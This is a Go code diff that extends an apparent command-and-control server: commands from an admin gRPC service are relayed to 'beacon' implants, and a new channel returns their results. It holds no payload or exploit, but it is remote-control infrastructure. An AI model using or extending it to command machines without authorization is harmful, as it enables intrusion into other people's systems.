@@ -14,17 +14,18 @@ import (
 // BeaconServer
 ////////////////////////////
 type BeaconServer struct {
-	m_chanCmd chan *grpcapi.Command // recv cmd from admin server
+	m_chanCmd    chan *grpcapi.Command // recv cmd from admin server
+	m_chanResult chan *grpcapi.Command // send result to admin server
 }
 
-func NewBeaconServer(_chanCmd chan *grpcapi.Command) *BeaconServer {
+func NewBeaconServer(_chanCmd, _chanResult chan *grpcapi.Command) *BeaconServer {
 	newBeaconServer := new(BeaconServer)
 	newBeaconServer.m_chanCmd = _chanCmd
+	newBeaconServer.m_chanResult = _chanResult
 	return newBeaconServer
 }
 
 func (beaconServer *BeaconServer) FetchCommand(context context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
-	//cmd := new(grpcapi.Command)
 
 	cmd := <-beaconServer.m_chanCmd
 
@@ -34,6 +35,7 @@ func (beaconServer *BeaconServer) FetchCommand(context context.Context, empty *g
 func (beaconServer *BeaconServer) SendResult(context context.Context, cmdResult *grpcapi.Command) (*grpcapi.Empty, error) {
 	log.Printf("recv result:")
 	log.Printf(cmdResult.Out)
+	beaconServer.m_chanResult <- cmdResult
 	return &grpcapi.Empty{}, nil
 }
 
@@ -41,17 +43,23 @@ func (beaconServer *BeaconServer) SendResult(context context.Context, cmdResult 
 // AdminServer
 ////////////////////////////
 type AdminServer struct {
-	m_chanCmd chan *grpcapi.Command // send cmd to beacon server
+	m_chanCmd    chan *grpcapi.Command // send cmd to beacon server
+	m_chanResult chan *grpcapi.Command // recv result from beacon server
 }
 
-func NewAdminServer(_chanCmd chan *grpcapi.Command) *AdminServer {
+func NewAdminServer(_chanCmd, _chanResult chan *grpcapi.Command) *AdminServer {
 	newAdminServer := new(AdminServer)
 	newAdminServer.m_chanCmd = _chanCmd
+	newAdminServer.m_chanResult = _chanResult
 	return newAdminServer
 }
 func (adminServer *AdminServer) SendCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
+	var res *grpcapi.Command
+	log.Printf("send command:")
 	adminServer.m_chanCmd <- cmd
-	return &grpcapi.Command{}, nil
+	res = <-adminServer.m_chanResult
+	log.Printf("recv results:")
+	return res, nil
 }
 
 var (
@@ -69,17 +77,19 @@ func main() {
 		grpcAdminServer *grpc.Server
 		adminListener   net.Listener
 
-		chanCmd chan *grpcapi.Command
+		chanCmd    chan *grpcapi.Command
+		chanResult chan *grpcapi.Command
 
 		err error
 	)
 
 	// 0. init channel
-	chanCmd = make(chan *grpcapi.Command) // no buffer to block the client input goroutine
+	chanCmd = make(chan *grpcapi.Command)    // no buffer to block the client input goroutine
+	chanResult = make(chan *grpcapi.Command) // no buffer to block the client input goroutine
 
 	// 1. Beacon server
 	// 1.1 register beacon server
-	beaconServer = NewBeaconServer(chanCmd)
+	beaconServer = NewBeaconServer(chanCmd, chanResult)
 	grpcBeaconServer = grpc.NewServer()
 	grpcapi.RegisterBeaconServer(grpcBeaconServer, beaconServer)
 
@@ -97,7 +107,7 @@ func main() {
 
 	// 2. Admin server
 	// 2.1 register admin server
-	adminServer = NewAdminServer(chanCmd)
+	adminServer = NewAdminServer(chanCmd, chanResult)
 	grpcAdminServer = grpc.NewServer()
 	grpcapi.RegisterAdminServer(grpcAdminServer, adminServer)
 
